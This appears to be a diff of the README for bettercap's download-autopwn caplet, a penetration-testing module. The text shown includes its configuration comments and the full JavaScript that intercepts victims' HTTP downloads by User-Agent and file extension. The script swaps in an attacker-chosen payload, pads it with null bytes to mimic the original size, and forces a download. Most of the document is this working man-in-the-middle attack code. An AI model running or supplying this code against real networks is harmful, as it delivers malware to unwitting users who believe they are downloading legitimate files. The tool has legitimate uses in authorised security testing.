@@ -6,7 +6,7 @@
 Everything is configurable in the **download-autopwn.cap** file.
 
 ```sh
-# documentation can be found at https://github.com/bettercap/caplets/...
+# documentation can be found at https://github.com/bettercap/caplets/blob/master/download-autopwn/README.md
 # 
 # this module lets you intercept very specific download requests and replaces the payload with one of your choice
 #
@@ -14,7 +14,8 @@ Everything is configurable in the **download-autopwn.cap** file.
 #    1. the victim's user-agent string must match the downloadautopwn.useragent.x regexp value
 #    2. the requested file must match one of the downloadautopwn.extensions.x file extensions
 #
-# you can find the downloadautopwn.devices in the caplets/download-autopwn/ folder (you can always add your own)
+# you can find the downloadautopwn.devices in the caplets/download-autopwn/ folder (you can add your own)
+#
 
 # choose the devices from which downloads get pwned (enter the dir names of choice from caplets/download-autopwn/)
 # (or feel free to add your own)
@@ -72,7 +73,7 @@ The victim's User-Agent string has to match this regex value.
 
 <br>
 
-The `downloadautopwn.extensions.x` variables accept file extensions that are present in the device's folder (where `x` is the device name).
+The `downloadautopwn.extensions.x` variables accept comma separated file extensions that are present in the device's folder (where `x` is the device name).
 <br>
 These files must be present in the device's folder, and they must be called `payload` (for example: `payload.exe`).
 
@@ -89,84 +90,83 @@ If this value is set to true, your payloads will be resized to match the request
 No changes should have to be made in the **download-autopwn.js** file.
 
 ```javascript
-var targets = {},
-    devices = []
+var targets = {}
 
 var nullbyte = "\u0000"
 
 var green   = "\033[32m",
     boldRed = "\033[1;31m",
     onRed   = "\033[41m",
-    reset   = "\033[0m"
+    reset   = "\033[0m",
+    redLine = "\n  " + onRed + " " + reset
 
 function onLoad() {
-  devices = env("downloadautopwn.devices").split(",")
-  for (var i = 0; i < devices.length; i++) {
-    item = {
-      "device": devices[i],
-      "useragent": env("downloadautopwn.useragent." + devices[i]),
-      "extensions": env("downloadautopwn.extensions." + devices[i]).split(",")
-    }
-    targets[i] = item
-    logStr = "\n  " + green + targets[i]["device"] + reset +
-      "\n    User-Agent: " + targets[i]["useragent"] + 
-      "\n    Extensions: " + targets[i]["extensions"] + "\n"
-  }
-  log("Download Autopwn loaded.\n\nDownload Autopwn targets: \n" + logStr)
+	devices = env("downloadautopwn.devices").split(",")
+	logStr = ""
+	for (var i = 0; i < devices.length; i++) {
+		item = {
+			"device": devices[i],
+			"useragent": env("downloadautopwn.useragent." + devices[i]),
+			"extensions": env("downloadautopwn.extensions." + devices[i]).toLowerCase().split(",")
+		}
+		targets[i] = item
+		logStr += "\n  " + green + targets[i]["device"] + reset +
+		          "\n    User-Agent: " + targets[i]["useragent"] + 
+		          "\n    Extensions: " + targets[i]["extensions"] + "\n"
+	}
+	log("Download Autopwn loaded.\n\nDownload Autopwn targets: \n" + logStr)
 }
 
 function onResponse(req, res) {
-  // First of all check whether the requested path might have an extension (to save cpu)
-  var strippedPath = req.Path.replace(/.*\//g, "")
-  if (strippedPath.indexOf(".") != -1) {
-    var userAgent,
-        extension
-    // Grab User-Agent
-    for (var h = 0; h < req.Headers.length; h++) {
-      if (req.Headers[h]["Name"] == "User-Agent") {
-        userAgent = req.Headers[h]["Value"]
-      }
-    }
-    // Iterate through targets
-    for (var t = 0; t < Object.keys(targets).length; t++) {
-      // Check if User-Agent is a target
-      regex = new RegExp(targets[t]["useragent"])
-      if ( userAgent.match(regex) ) {
-        // Iterate through target extensions
-        for (var e = 0; e < targets[t]["extensions"].length; e++) {
-          // Check if requested path contains a targeted extension
-          // function endsWith() could be a nice simplification here
-          if ( strippedPath.replace(/.*\./g, "") == targets[t]["extensions"][e] ) {
-            extension = targets[t]["extensions"][e]
-            // Autopwn
-            logStr = "\n\n  " + onRed + " " + reset + "  Autopwning download request from " + boldRed + req.Client + reset
-            logStr += "\n  " + onRed + " " + reset
-            logStr += "\n  " + onRed + " " + reset + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset
-            logStr += "\n  " + onRed + " " + reset
-            logStr += "\n  " + onRed + " " + reset + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
-            // Check requested file size
-            requestedFile = res.ReadBody()
-            requestedFileSize = requestedFile.length
-            payload = readFile("caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
-            payloadSize = payload.length
-            logStr += "\n  " + onRed + " " + reset + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
-            logStr += "\n  " + onRed + " " + reset + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
-            logStr += "\n  " + onRed + " " + reset
-            // Append nullbytes to payload if requested file is larger than payload and resizing is enabled
-            if (requestedFileSize > payloadSize && env("downloadautopwn.resizepayloads") == "true") {
-              logStr += "\n  " + onRed + " " + reset + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
-              sizeDifference = requestedFileSize - payloadSize
-              nullbyteString = Array(sizeDifference + 1).join(nullbyte)
-              payload += nullbyteString
-            }
-            logStr += "\n  " + onRed + " " + reset + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
-            log(logStr)
-            res.Body = payload
-          }
-        }
-      }
-    }
-  }
+	// First of all check whether the requested path might have an extension (to save cpu)
+	var requestedFileName = req.Path.replace(/.*\//g, "")
+	if ( requestedFileName.indexOf(".") != -1 ) {
+		var userAgent = req.GetHeader("User-Agent", ""),
+		    extension,
+		    headerCount = req.Headers.length
+		// Iterate through targets
+		for ( var t = 0; t < Object.keys(targets).length; t++ ) {
+			// Check if User-Agent is a target
+			regex = new RegExp(targets[t]["useragent"])
+			if ( userAgent.match(regex) ) {
+				// Iterate through target extensions
+				for (var e = 0; e < targets[t]["extensions"].length; e++) {
+					// Check if requested path contains a targeted extension
+					// function endsWith() could be a nice simplification here
+					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
+						extension = targets[t]["extensions"][e]
+						// Autopwn
+						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client + reset + 
+						         redLine + 
+						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
+						         redLine + 
+						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
+						// Check requested file size
+						requestedFile = res.ReadBody()
+						requestedFileSize = requestedFile.length
+						payload = readFile("caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
+						payloadSize = payload.length
+						logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes" + 
+						          redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes" + redLine
+						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
+						if ( env("downloadautopwn.resizepayloads") == "true" && requestedFileSize > payloadSize ) {
+							logStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
+							sizeDifference = requestedFileSize - payloadSize
+							nullbyteString = Array(sizeDifference + 1).join(nullbyte)
+							payload += nullbyteString
+						}
+						// Set Content-Disposition header to enforce file download instead of in-browser preview
+						res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
+						// Update Content-Length header in case our payload is larger than the requested file
+						res.SetHeader("Content-Length", payload.length)
+						logStr += redLine + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
+						log(logStr)
+						res.Body = payload
+					}
+				}
+			}
+		}
+	}
 }
 ```
 
